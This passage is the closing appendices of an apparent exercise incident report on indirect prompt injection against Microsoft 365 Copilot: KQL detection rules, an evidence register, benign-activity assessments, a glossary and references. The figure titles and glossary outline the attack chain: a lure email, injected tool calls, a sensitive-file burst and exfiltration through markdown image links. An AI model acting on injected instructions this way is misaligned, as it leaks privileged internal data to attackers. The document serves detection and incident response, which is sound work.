| summarize Files=dcount(OfficeObjectId), Sites=make_set(Site) by UserId, bin(TimeGenerated, 1m)
| where Files >= 5
```

**A.8 Detection D-005: search burst in one Copilot session**

```kql
CopilotAudit_CL
| where TimeGenerated > ago(1h) and InteractionType == "Search"
| summarize Searches=count(), Terms=make_set(ToolParameters, 20) by UserId, SessionId, bin(TimeGenerated, 5m)
| where Searches >= 3
```

Detection D-003 is the chain correlation in A.3, scheduled hourly with a three-hour lookback.

## Appendix B. Evidence Register

| Figure | File | Content |
|---|---|---|
| 1 | 01-schema.png | Schema confirmation |
| 2 | 02-volume.png | Activity volume profile |
| 3 | 18-timeline-visual.png | Session activity chart |
| 4 | 03-lure-email.png | Lure email |
| 5 | 04-external-senders.png | External senders |
| 6 | 23-lure-recipients.png | Lure recipients |
| 7 | 05-merged-timeline.png | Merged timeline |
| 8 | 21-victim-prompts.png | Analyst prompts |
| 9 | 06-session-baseline.png | Session baseline |
| 10 | 17-noise-example.png | Summarisation sessions compared |
| 11 | 07-session-transcript.png | Attack session transcript |
| 12 | 08-injected-tool-calls.png | Injected tool calls |
| 13 | 09-file-burst.png | File access events |
| 14 | 22-sensitive-file-count.png | Sensitive file count |
| 15 | 19-burst-files-other-users.png | Other users on burst files |
| 16 | 20-sensitivity-labels.png | Sensitivity labels per session |
| 17 | 16.2-scope.png | Wave 2 search terms |
| 18 | 11-response-urls.png | Response with exfiltration links |
| 19 | 12-url-domains.png | Decoded payloads |
| 20 | 10-chain-correlation.png | Chain correlation |
| 21 | 13-no-other-exfil.png | Alternative exfiltration check |
| 22 | 14-signins-clean.png | Sign-in summary |
| 23 | 15-admin-activity.png | Administrator activity |
| 24 | 16.1-scope.png | Lure recipients' Copilot activity |

## Appendix C. Activity Assessed as Benign

| Activity | Identity | Assessment | Basis |
|---|---|---|---|
| Azure Portal and Outlook Mobile sign-ins | emily.chen | Benign | Known IP, successful, consistent with profile |
| Seven "Summarise" Copilot sessions | emily.chen | Benign | Same request type as the attack, zero tool activity |
| Weekly analytics marketing email | emily.chen | Benign | Known sender, no attachment interaction |
| All-hands reminder email at 10:59:45 | emily.chen | Benign | Internal, no attachments, no link to the chain |
| All activity in the window | mark.ross | Routine administration | Known IP, no Copilot use, no exposed files accessed |
| Service account sign-ins from 0.0.0.0 | svc-compliance, svc-backup | Benign | Microsoft service applications |
| Sessions with more responses than prompts | Several users | Benign | Occurs in normal sessions without tool activity |
| Sign-ins from Amsterdam and London | connor.hughes | Unrelated, referred | No link to the attack chain; separate impossible-travel review |

## Appendix D. Glossary

| Term | Meaning |
|---|---|
| Indirect prompt injection | Instructions hidden in content that an AI model processes (a document, email or web page), causing the model to act on them as if they came from the user |
| LLM scope violation | An AI assistant using privileged internal data in response to instructions from untrusted external content |
| Grounding | The data an AI assistant retrieves and uses to answer a request |
| Exfiltration | Unauthorised transfer of data out of the organisation |
| Markdown image link | Text of the form `![label](url)` that a client renders by fetching the URL |
| KQL | Kusto Query Language, used in Microsoft Sentinel and Defender advanced hunting |
| MITRE ATLAS | MITRE's knowledge base of adversary techniques against AI systems |
| TLP:AMBER | Traffic Light Protocol marking: limited disclosure, recipients may share within their organisation on a need-to-know basis |

## Appendix E. References

1. Microsoft Security Response Center. CVE-2025-32711, Microsoft 365 Copilot Information Disclosure Vulnerability. https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32711
2. The Hacker News. Zero-Click AI Vulnerability Exposes Microsoft 365 Copilot Data Without User Interaction, June 2025. https://thehackernews.com/2025/06/zero-click-ai-vulnerability-exposes.html
3. Willison, S. Breaking down "EchoLeak", the first zero-click AI vulnerability, June 2025. https://simonwillison.net/2025/Jun/11/echoleak/
4. Unit 42, Palo Alto Networks. Fooling AI Agents: Web-Based Indirect Prompt Injection Observed in the Wild, March 2026. https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/
5. MITRE. AML.T0051.001 LLM Prompt Injection: Indirect (via MITRE D3FEND). https://d3fend.mitre.org/offensive-technique/attack/AML.T0051.001/
6. MITRE ATT&CK Enterprise Matrix. https://attack.mitre.org/

CVE-2026-24301 ("CoSnitch") and CVE-2026-42824 ("SearchLeak") are cited as listed in the exercise reference material and have not been independently verified.
